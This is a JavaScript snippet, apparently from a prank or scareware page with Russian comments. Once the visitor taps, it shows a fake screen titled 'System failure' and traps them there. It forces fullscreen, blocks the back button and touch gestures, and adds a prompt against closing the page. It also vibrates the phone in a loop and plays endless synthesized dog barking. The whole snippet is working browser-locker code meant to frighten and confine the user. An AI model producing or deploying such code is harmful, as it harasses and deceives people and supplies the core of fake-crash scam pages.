<script>
let activated = false;

function activate() {
  if (activated) return;
  activated = true;

  // Скрыть оверлей, показать фейк
  document.getElementById('overlay').style.display = 'none';
  document.getElementById('fake').style.display = 'flex';

  // === FULLSCREEN ===
  try {
    document.documentElement.requestFullscreen({ navigationUI: 'hide' }).catch(()=>{});
    if (screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
  } catch(e){}

  // === БЛОКИРОВКА НАЗАД ===
  history.pushState(null, null, location.href);
  window.addEventListener('popstate', () => history.pushState(null, null, location.href));

  // === ВИБРАЦИЯ ===
  if (navigator.vibrate) {
    navigator.vibrate([500, 100, 500]);
    setInterval(() => navigator.vibrate([300, 100, 300, 100, 600]), 900);
  }

  // === ЗВУК СОБАК (гарантированный запуск) ===
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    ctx.resume().then(() => {
      playDog(ctx);
    });
  } catch(e){}

  function playDog(ctx) {
    const dur = 0.45;
    const buf = ctx.createBuffer(1, ctx.sampleRate * dur, ctx.sampleRate);
    const data = buf.getChannelData(0);
    for (let i=0; i<data.length; i++) {
      const t = i / ctx.sampleRate;
      data[i] = 0.7 * (t * 320 % 1 - 0.5)
              + 0.3 * (Math.random()*2 - 1)
              + 0.4 * Math.sin(t * 1400) * Math.exp(-t*9);
    }
    const s = ctx.createBufferSource();
    s.buffer = buf;
    const g = ctx.createGain();
    g.gain.value = 1.0;
    s.connect(g);
    g.connect(ctx.destination);
    s.start();
    s.onended = () => {
      setTimeout(() => playDog(ctx), 250 + Math.random()*300);
    };
  }

  // === БЛОКИРОВКА ЖЕСТОВ ===
  document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
  document.addEventListener('gesturestart', e => e.preventDefault(), { passive: false });
  document.addEventListener('gesturechange', e => e.preventDefault(), { passive: false });
  document.addEventListener('gestureend', e => e.preventDefault(), { passive: false });

  // === ЗАЩИТА ОТ ЗАКРЫТИЯ ===
  window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });

  document.title = '⚠️ Системный сбой';
}

// Автозапуск не работает — только через тап
